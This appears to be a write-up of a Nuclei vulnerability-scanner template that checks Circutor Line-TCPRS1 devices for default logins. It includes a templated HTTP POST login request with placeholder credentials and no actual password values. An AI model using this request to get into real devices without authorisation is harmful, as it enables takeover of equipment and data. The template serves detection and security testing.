# Nuclei Template: Circutor Line-TCPRS1 - Default Login
**Template ID:** circutor-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`circutor-default-login.yaml`)

## Vulnerability Information & PoC

## Description
A default login was discovered on a Circutor Line-TCPRS1 device. An attacker can obtain access to user accounts, access sensitive information, modify data, and execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /api/v1/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"Username":"{{username}}","Password":"{{password}}"}
```

## References
- https://circutor.com/en/products/line-tcprs1/
